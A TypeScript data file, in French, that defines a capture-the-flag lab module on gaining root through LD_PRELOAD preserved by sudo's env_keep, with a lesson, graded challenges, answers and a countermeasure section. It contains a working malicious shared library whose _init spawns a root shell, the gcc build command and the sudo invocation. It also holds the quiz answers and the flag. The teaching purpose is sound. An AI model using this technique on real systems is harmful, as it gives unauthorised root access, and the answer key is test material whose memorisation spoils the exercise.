import type { CourseSeed } from "../../../types";

/** Cyber · Pratique — Module 21 : élévation via LD_PRELOAD préservé par sudo. Lab Docker réel (mono-conteneur). */
export const module21LdPreload: CourseSeed[] = [
  {
    slug: "prat-ld-preload",
    title: "Élévation via LD_PRELOAD",
    checkpoint: "prat-privesc-lateral",
    codename: "Silent Inject",
    domain: "Élévation de privilèges",
    theme: "grid",
    icon: "MemoryStick",
    accent: "#6BC48F",
    order: 21,
    difficulty: "hard",
    summary:
      "sudo est configuré correctement — une seule commande anodine autorisée. Mais une protection par défaut a été désactivée : la variable LD_PRELOAD est préservée à travers sudo. Elle force le chargeur dynamique à charger TA bibliothèque avant le programme visé, exécutant ton code en root quel que soit ce programme.",
    objectives: [
      "Lire une configuration sudo avec sudo -l",
      "Repérer une variable d'environnement préservée dangereusement (env_keep)",
      "Comprendre le rôle de LD_PRELOAD dans le chargement dynamique",
      "Compiler une bibliothèque partagée avec un point d'entrée _init",
      "Détourner sudo pour exécuter du code root",
    ],
    sandbox: {
      attackerImage: "cyberace/module21-ld-preload-lab:latest",
      ttlSec: 1200,
      attackerCapAdd: [],
      ports: [{ containerPort: 7681, label: "Terminal web (ttyd)" }],
    },
    lesson: `# 🧬 Élévation via LD_PRELOAD — Silent Inject

Une **sixième voie** d'élévation, distincte de tout ce qui précède. Ici, \`sudo\` est **bien configuré** dans sa règle de commande… mais une **option de sécurité** a été désactivée, et ça change tout. 🏎️

---

## 🧭 Le briefing

> \`sudo -l\` te montrera une commande autorisée bien **inoffensive**. Regarde aussi la **ligne juste au-dessus**.

Tu es \`stagiaire\`. Objectif : lire \`/root/flag.txt\`.

---

## 1. sudo -l : la configuration autorisée 🔍

\`\`\`bash
sudo -l
\`\`\`

Tu vois deux choses :
- une **commande autorisée** : \`stagiaire\` peut lancer \`/usr/bin/id\` en root, sans mot de passe ;
- une **ligne \`env_keep\`** : \`Defaults env_keep += "LD_PRELOAD"\`.

Cette seconde ligne est la **faille**.

---

## 2. Ce que fait normalement sudo 🛡️

Par défaut, \`sudo\` **réinitialise** l'environnement : il **efface** les variables dangereuses (dont \`LD_PRELOAD\`) avant d'exécuter la commande. C'est une protection **essentielle**.

Ici, \`env_keep += "LD_PRELOAD"\` **désactive** cette protection pour cette variable : \`LD_PRELOAD\` est **préservée** à travers \`sudo\`. On peut donc l'utiliser.

---

## 3. Ce qu'est LD_PRELOAD 🧠

**\`LD_PRELOAD\`** force le **chargeur dynamique** (*ld.so*) à charger une **bibliothèque partagée AVANT toutes les autres**, y compris avant celles du programme ciblé. Si cette bibliothèque contient une fonction **\`_init()\`** (exécutée **automatiquement** au chargement), ce code s'exécute **avant même** que le programme visé ne démarre — et **avec les privilèges de sudo (root)**.

---

## 4. Fabriquer la bibliothèque piégée 🛠️

\`\`\`c
// evil.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
\`\`\`

Compilation en bibliothèque partagée **position-indépendante**, sans code de démarrage standard :

\`\`\`bash
gcc -shared -fPIC -o evil.so evil.c -nostartfiles
\`\`\`

*(\`build-essential\` fournit \`gcc\` dans ce lab.)*

---

## 5. Exploiter 🎯

\`\`\`bash
sudo LD_PRELOAD=$PWD/evil.so /usr/bin/id
\`\`\`

\`sudo\` lance \`/usr/bin/id\` en root, mais **charge d'abord** ta \`evil.so\` → \`_init()\` s'exécute en root et ouvre un shell. Il ne reste qu'à lire le flag :

\`\`\`bash
cat /root/flag.txt
\`\`\`

> ⚠️ \`$PWD\` doit pointer vers le dossier **contenant** \`evil.so\`.

---

## 6. La contre-mesure 🛡️

Ne **jamais** ajouter \`LD_PRELOAD\` (ni \`LD_LIBRARY_PATH\`, etc.) à \`env_keep\` dans \`sudoers\`. La réinitialisation d'environnement de sudo existe **exactement** pour bloquer cette attaque — la désactiver revient à offrir root.

---

## 🧠 À retenir

- \`sudo\` **réinitialise** l'environnement par sécurité ; \`env_keep += "LD_PRELOAD"\` **désactive** cette protection.
- **\`LD_PRELOAD\`** charge une bibliothèque **avant** le programme ciblé.
- La fonction **\`_init()\`** d'une bibliothèque partagée s'exécute **automatiquement** au chargement.
- **\`gcc -shared -fPIC -o evil.so evil.c -nostartfiles\`** compile la charge utile.
- **\`sudo LD_PRELOAD=$PWD/evil.so /usr/bin/id\`** exécute ton code en root.
- Parade : **ne jamais** mettre \`LD_PRELOAD\` dans \`env_keep\`.`,
    badge: {
      id: "badge-prat-ldpreload",
      name: "Injecteur de Bibliothèques",
      icon: "MemoryStick",
      description: "A fait exécuter son propre code avant même que le programme visé ne démarre.",
    },
    challenges: [
      {
        id: "prat-ldpreload-t1",
        title: "Qui suis-je ?",
        order: 1,
        difficulty: "easy",
        type: "text",
        prompt: `## 🧭 Qui suis-je ?

Démarre le lab. Identifie ton compte :

\`\`\`bash
id
\`\`\`

**Question :** quelle **commande** affiche l'utilisateur courant et ses groupes ?`,
        points: 50,
        timeLimitSec: 200,
        hints: [],
        answer: "id",
        caseSensitive: false,
        explanation: `**\`id\`** confirme que tu es \`stagiaire\`, non privilégié.`,
        tags: ["ldpreload", "recon", "id"],
      },
      {
        id: "prat-ldpreload-t2",
        title: "Que permet sudo -l",
        order: 2,
        difficulty: "easy",
        type: "text",
        prompt: `## 🔍 sudo -l

\`\`\`bash
sudo -l
\`\`\`

**Question :** d'après \`sudo -l\`, quelle **commande** \`stagiaire\` peut-il exécuter en root sans mot de passe ?`,
        points: 100,
        timeLimitSec: 300,
        hints: [],
        answer: "/usr/bin/id",
        accept: ["id"],
        caseSensitive: true,
        explanation: `\`stagiaire\` peut lancer **\`/usr/bin/id\`** en root sans mot de passe. Commande anodine… mais le détournement se joue **avant** son exécution.`,
        tags: ["ldpreload", "sudo"],
      },
      {
        id: "prat-ldpreload-t3",
        title: "Repérer la variable préservée",
        order: 3,
        difficulty: "medium",
        type: "text",
        prompt: `## 🎯 La ligne juste au-dessus

Regarde la ligne \`Defaults env_keep += "..."\` dans la sortie de \`sudo -l\`.

**Question :** quelle **variable d'environnement**, normalement réinitialisée par sudo, est ici explicitement préservée ?`,
        points: 150,
        timeLimitSec: 350,
        hints: [],
        answer: "LD_PRELOAD",
        caseSensitive: false,
        explanation: `\`Defaults env_keep += "LD_PRELOAD"\` **préserve** \`LD_PRELOAD\` à travers sudo — désactivant la protection qui l'aurait effacée. C'est toute la vulnérabilité.`,
        tags: ["ldpreload", "env_keep"],
      },
      {
        id: "prat-ldpreload-t4",
        title: "Comprendre LD_PRELOAD",
        order: 4,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🧠 À quoi sert LD_PRELOAD ?

**Question :** à quoi sert la variable d'environnement \`LD_PRELOAD\` ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Elle force le chargeur dynamique à charger une bibliothèque partagée AVANT toutes les autres, y compris avant le programme ciblé lui-même",
          "Elle définit le chemin de recherche des exécutables",
          "Elle chiffre les bibliothèques partagées chargées",
          "Elle limite la mémoire disponible pour un processus",
        ],
        answer: 0,
        explanation: `\`LD_PRELOAD\` force le chargement d'une bibliothèque **avant** toutes les autres. Combinée à une fonction \`_init()\`, elle exécute du code **avant** le programme visé — ici avec les privilèges de sudo.`,
        tags: ["ldpreload", "ld.so"],
      },
      {
        id: "prat-ldpreload-t5",
        title: "Le point d'entrée de la bibliothèque",
        order: 5,
        difficulty: "medium",
        type: "text",
        prompt: `## 🧩 Point d'entrée automatique

**Question :** dans une bibliothèque partagée ELF, quelle **fonction spéciale** s'exécute automatiquement au chargement (technique utilisée ici) ?`,
        points: 200,
        timeLimitSec: 400,
        hints: [],
        answer: "_init",
        accept: ["init"],
        caseSensitive: false,
        explanation: `La fonction **\`_init()\`** d'une bibliothèque ELF s'exécute **automatiquement** dès son chargement — avant même le \`main\` du programme visé. C'est là qu'on place la charge utile.`,
        tags: ["ldpreload", "init", "elf"],
      },
      {
        id: "prat-ldpreload-t6",
        title: "Compiler",
        order: 6,
        difficulty: "medium",
        type: "text",
        prompt: `## 🛠️ Compiler la bibliothèque

**Question :** quelle **commande gcc** compile un fichier C en bibliothèque partagée position-indépendante, prête à être préchargée ?`,
        points: 200,
        timeLimitSec: 400,
        hints: [],
        answer: "gcc -shared -fPIC -o evil.so evil.c -nostartfiles",
        accept: ["gcc -shared -fPIC"],
        caseSensitive: true,
        explanation: `**\`gcc -shared -fPIC -o evil.so evil.c -nostartfiles\`** : \`-shared\` (bibliothèque), \`-fPIC\` (position-indépendant), \`-nostartfiles\` (pas de code de démarrage standard, pour que \`_init\` reste le point d'entrée).`,
        tags: ["ldpreload", "gcc", "compilation"],
      },
      {
        id: "prat-ldpreload-t7",
        title: "Exploiter (flag)",
        order: 7,
        difficulty: "hard",
        type: "text",
        prompt: `## 🎯 Exploiter

\`\`\`bash
sudo LD_PRELOAD=$PWD/evil.so /usr/bin/id
# puis, en root :
cat /root/flag.txt
\`\`\`

**Question :** colle le **flag**.`,
        points: 300,
        timeLimitSec: 700,
        hints: [
          { text: "$PWD doit pointer vers le dossier contenant evil.so — compile et exploite depuis le même répertoire.", cost: 25 },
          { text: "Commande complète : sudo LD_PRELOAD=$PWD/evil.so /usr/bin/id", cost: 40 },
        ],
        answer: "CYBERACE{ld_preload_env_keep_root}",
        caseSensitive: true,
        explanation: `sudo charge \`evil.so\` avant \`/usr/bin/id\` → \`_init()\` s'exécute en root et ouvre un shell → \`cat /root/flag.txt\` révèle \`CYBERACE{ld_preload_env_keep_root}\`.`,
        tags: ["ldpreload", "flag"],
      },
      {
        id: "prat-ldpreload-t8",
        title: "Contre-mesure",
        order: 8,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🛡️ Contre-mesure

**Question :** quelle configuration sudo aurait empêché cette exploitation ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Ne jamais ajouter LD_PRELOAD (ni des variables similaires comme LD_LIBRARY_PATH) à env_keep dans sudoers",
          "Interdire complètement l'usage de gcc sur le système",
          "Changer le nom de la commande autorisée",
          "Augmenter la fréquence de rotation des mots de passe",
        ],
        answer: 0,
        explanation: `La réinitialisation d'environnement de sudo existe pour bloquer exactement cette attaque. Ne **jamais** mettre \`LD_PRELOAD\`/\`LD_LIBRARY_PATH\` dans \`env_keep\` : c'est la seule vraie parade.`,
        tags: ["ldpreload", "contre-mesure"],
      },
    ],
  },
];
